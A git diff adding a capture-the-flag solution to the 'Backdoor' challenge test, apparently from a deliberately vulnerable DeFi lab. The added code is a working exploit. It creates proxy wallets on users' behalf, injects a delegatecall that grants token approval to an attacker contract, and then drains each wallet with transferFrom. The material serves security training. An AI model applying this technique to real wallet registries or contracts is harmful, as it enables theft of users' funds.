@@ -37,6 +37,67 @@ describe('[Challenge] Backdoor', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        // Create wallets for users.
+        /*
+        let usersAsSigners = [alice, bob, charlie, david];
+        for (let i = 0; i < users.length; i++) {
+            var initCode = this.masterCopy.interface.encodeFunctionData("setup", [
+                [users[i]],                         // _owners
+                1,                                  // _threshold
+                ethers.constants.AddressZero,       // to (optional delegateCall)
+                [],                                 // data (optional delegateCall)
+                ethers.constants.AddressZero,       // fallbackHandler
+                this.token.address,                 // paymentToken
+                0,                                  // payment
+                ethers.constants.AddressZero        // paymentReceiver
+            ]);
+
+
+            await this.walletFactory.connect(usersAsSigners[i]).createProxyWithCallback(
+                this.masterCopy.address,
+                initCode,
+                0,
+                this.walletRegistry.address
+            );
+        }
+        const wallet = await this.walletRegistry.wallets(alice.address);
+        const balance = await this.token.balanceOf(wallet);
+        console.log("Alice balance: %s DVT", ethers.utils.formatEther(balance));
+        // */
+
+        const BackdoorAttacker = await ethers.getContractFactory('BackdoorAttacker', attacker);
+        var attack_contract = await BackdoorAttacker.deploy(this.token.address);
+
+        // The flaw is that WalletRegistry assumes only Alice can create a wallet in her name.
+        // Checking if the wallet only has one owner is not a sufficient mitigation: we still 
+        // can control the wallet by providing an optional delegateCall.
+        const approveCall = attack_contract.interface.encodeFunctionData("approve", []);
+        for (let i = 0; i < users.length; i++) {
+            const initCode = this.masterCopy.interface.encodeFunctionData("setup", [
+                [users[i]],                         // _owners
+                1,                                  // _threshold
+                attack_contract.address,            // to (optional delegateCall)
+                approveCall,                        // data (optional delegateCall)
+                ethers.constants.AddressZero,       // fallbackHandler
+                ethers.constants.AddressZero,       // paymentToken
+                0,                                  // payment
+                ethers.constants.AddressZero        // paymentReceiver
+            ]);
+
+
+            const tx = await this.walletFactory.connect(attacker).createProxyWithCallback(
+                this.masterCopy.address,
+                initCode,
+                0,
+                this.walletRegistry.address
+            );
+            const receipt = await tx.wait();
+            const event = receipt.events.find(event => event.event === "ProxyCreation");
+            const userWallet = event.args.proxy;
+        
+            await this.token.connect(attacker).transferFrom(userWallet, attacker.address, ethers.utils.parseEther("10"));
+        }
     });
 
     after(async function () {
